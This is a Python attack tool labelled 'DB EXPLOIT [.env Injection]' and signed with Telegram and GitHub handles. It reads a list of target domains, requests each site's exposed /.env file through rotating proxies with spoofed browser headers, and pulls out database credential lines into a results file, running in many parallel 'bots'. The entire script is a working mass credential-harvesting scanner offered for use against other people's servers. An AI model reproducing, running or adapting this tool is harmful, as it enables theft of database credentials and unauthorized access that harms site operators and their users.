import sys,os,re,json,time,random
import threading
from threading import Barrier, Thread, Semaphore
import warnings
import logging
from logging import WARNING as W
try:
    import urllib3
except ModuleNotFoundError:
    os.system('pip install urllib3')        
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
try:
    from colorama import Fore, init
except ModuleNotFoundError:
    os.system('pip install colorama')        
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
try:
    from fake_headers import Headers
except ModuleNotFoundError:
    os.system('pip install fake-headers')        
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
try:
    import ctypes
except ModuleNotFoundError:
    os.system('pip install ctypes')
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    import ctypes
try:
    import httpx
except ModuleNotFoundError:
    os.system('pip install httpx')
    os.system('pip install httpx[http2]')
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    import httpx
# =====================================
init(convert=True)
warnings.filterwarnings("ignore", category=DeprecationWarning)
os.environ["WDM_LOG_LEVEL"] = str(W)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
screenlock = Semaphore(value=1)
os.environ['WDM_LOG'] = str(logging.NOTSET)
logging.disable(logging.CRITICAL)
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')
# =====================================
Good = 0
Bad = 0
Unknown = 0
retries = 0
newtry = 0
errorTemp1 = 0
errorTemp2 = 0
errorTemp3 = 0
dm_lines = open('domains.txt','r').readlines()
Total_dm = len(dm_lines)
prox_lines = open('proxies.txt','r').readlines()
Total_pr = len(prox_lines)

try:
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(' DB EXPLOIT [.env Injection] || Total Domains: {} | Total Proxies: {} | Good: {} | Bad: {} | Retries: {}'.format(Total_dm,Total_pr,Good,Bad,retries))
    else:
        sys.stdout.write('\x1b]2; DB EXPLOIT [.env Injection] || Total Domains: {} | Total Proxies: {} | Good: {} | Bad: {}  | Retries: {}\x07'.format(Total_dm,Total_pr,Good,Bad,retries))
except:
    pass


def delete_line(my_file):
    file = my_file
    with open(file, 'r+') as f:
        lines = f.readlines()
        f.close()
        del lines[0]
    new_f = open(file, 'w')
    for line in lines:
        if line == '\n':
            continue
        else:
            new_f.write(f'{line.strip()}\n')


def runBrowser(domain):
    try:
                global Good
                global Bad,Unknown
                global retries,newtry
                global prox_lines
                global errorTemp1,errorTemp2,errorTemp3
                stopNow = False
                
                try:
                    if os.name == 'nt':
                        ctypes.windll.kernel32.SetConsoleTitleW(' DB EXPLOIT [.env Injection] || Total Domains: {} | Total Proxies: {} | Good: {} | Bad: {} | Retries: {}'.format(Total_dm,Total_pr,Good,Bad,retries))
                    else:
                        sys.stdout.write('\x1b]2; DB EXPLOIT [.env Injection] || Total Domains: {} | Total Proxies: {} | Good: {} | Bad: {}  | Retries: {}\x07'.format(Total_dm,Total_pr,Good,Bad,retries))
                except:
                    pass
                
                try:
                    configFile = json.load(open('config.json'))
                except Exception as e:
                    screenlock.acquire()
                    print(Fore.LIGHTYELLOW_EX+f'{e}'+Fore.RESET)
                    screenlock.release()
                
                
                sms_proxies = {
                    "http://":f"http://{configFile['proxy']['Username'].strip()}:{configFile['proxy']['Password'].strip()}@{configFile['proxy']['Server'].strip()}",
                    "https://":f"http://{configFile['proxy']['Username'].strip()}:{configFile['proxy']['Password'].strip()}@{configFile['proxy']['Server'].strip()}",
                    }
                try:
                    random.shuffle(prox_lines)
                    proxy = random.choice(prox_lines).strip()
                    proxies = {
                        "http://":f"http://{proxy}",
                        "https://":f"http://{proxy}",
                        }
                except:
                    proxies = {}
                
                if proxyMode == 1:
                    session = httpx.Client(http2=True,follow_redirects=True,proxies=proxies,timeout=30)
                else:
                    session = httpx.Client(http2=True,follow_redirects=True,proxies=sms_proxies,timeout=30)
                
                session.cookies.clear()
                
                header = Headers(headers=True).generate()
                
                myDomain = str(domain).replace("https://","").replace("http://","").replace("/.env", "").strip()
                
                req1 = session.get(f"https://{myDomain}/.env",
                                    headers=header
                                    )
                
                matches = re.findall('^db.*\s', req1.text.lower(), re.MULTILINE)
                if matches !=[]:
                    Good+=1
                    screenlock.acquire()
                    print(f"{Fore.YELLOW}[*] Checking: {myDomain}{Fore.RESET}{Fore.GREEN} [DBs Found!]{Fore.RESET}\n")
                    with open("DB_Results.txt","a") as rs:
                        rs.write(f"[*] Domain: {myDomain}\n")
                    screenlock.release()
                    for match in matches:
                        screenlock.acquire()
                        print (f"   {Fore.GREEN}{str(match).strip()}{Fore.RESET}")
                        with open("DB_Results.txt","a") as rs:
                            rs.write(str(match).strip()+"\n")
                        screenlock.release()
                    screenlock.acquire()
                    print("-"*50+"\n")
                    screenlock.release()
                    with open("DB_Results.txt","a") as rs:
                            rs.write("-"*70+"\n")
                else:
                    Bad+=1
                    screenlock.acquire()
                    print(f"{Fore.YELLOW}[*] Checking: {myDomain}{Fore.RESET}{Fore.RED} [No DB Found!]{Fore.RESET}")
                    screenlock.release()      
                
                try:
                    if os.name == 'nt':
                        ctypes.windll.kernel32.SetConsoleTitleW(' DB EXPLOIT [.env Injection] || Total Domains: {} | Total Proxies: {} | Good: {} | Bad: {} | Retries: {}'.format(Total_dm,Total_pr,Good,Bad,retries))
                    else:
                        sys.stdout.write('\x1b]2; DB EXPLOIT [.env Injection] || Total Domains: {} | Total Proxies: {} | Good: {} | Bad: {}  | Retries: {}\x07'.format(Total_dm,Total_pr,Good,Bad,retries))
                except:
                    pass    
    except KeyboardInterrupt:
        sys.exit()
    except Exception as e:
        # screenlock.acquire()
        # print(Fore.RED+f'[-] Error: {e}. [Line: {sys.exc_info()[-1].tb_lineno}]'+Fore.RESET)
        # screenlock.release()
        retries +=1
        newtry +=1
        if newtry % 2 != 0:
            runBrowser(domain)


if __name__ == '__main__':
    print(Fore.RED)
    message = Fore.LIGHTWHITE_EX+f'''{Fore.RED}
    *======================== {Fore.LIGHTGREEN_EX}Telegram: @hello0_0world{Fore.RED} =============================*
    |{Fore.BLUE}              ______   ______        _______  _                                {Fore.RED}|
    |{Fore.BLUE}              (  __  \ (  ___ \      (  ____ \( (    /||\     /|               {Fore.RED}|
    |{Fore.BLUE}              | (  \  )| (   ) )     | (    \/|  \  ( || )   ( |               {Fore.RED}|
    |{Fore.BLUE}              | |   ) || (__/ /      | (__    |   \ | || |   | |               {Fore.RED}|
    |{Fore.BLUE}              | |   | ||  __ (       |  __)   | (\ \) |( (   ) )               {Fore.RED}|
    |{Fore.BLUE}              | |   ) || (  \ \      | (      | | \   | \ \_/ /                {Fore.RED}|
    |{Fore.BLUE}              | (__/  )| )___) )   _ | (____/\| )  \  |  \   /                 {Fore.RED}|
    |{Fore.BLUE}              (______/ |/ \___/   (_)(_______/|/    )_)   \_/                  {Fore.RED}|
    |{Fore.BLUE}                                                                               {Fore.RED}|
    *======================== {Fore.LIGHTGREEN_EX}Github: @Abdallah-Ibra{Fore.RED}  ==============================*

    {Fore.RESET}'''
    for char in message:
        sys.stdout.write(char)
    sys.stdout.flush()
    print(Fore.RED)

    try:
        proxyMode = int(input('[?] Enter Your Proxy Mode (1. proxies.txt[No Proxies] 2. config.json Proxies): '))
    except:
        proxyMode = 1
    
    try:
        numOfBots = int(input('[?] Enter The Number Of Bots: '))
    except:
        numOfBots =1
    try:
        NUMBER_OF_THREADS = int(numOfBots) if int(numOfBots) > 0 else 1
    except:
        NUMBER_OF_THREADS = 1
    
    while True:
        file1 = open('domains.txt', 'r')
        numbers= file1.readlines()
        if os.path.getsize('domains.txt') != 0:
            for number in numbers:
                delete_line('domains.txt')
                lista_threads = []
                while threading.active_count() == int(NUMBER_OF_THREADS)+1:
                    time.sleep(1)
                thread = threading.Thread(target=runBrowser,args=[str(number).strip()])
                thread.start()
        else:
            screenlock.acquire()
            print(Fore.RED+f'[-] No Domains Found!'+Fore.RESET)
            screenlock.release()
            break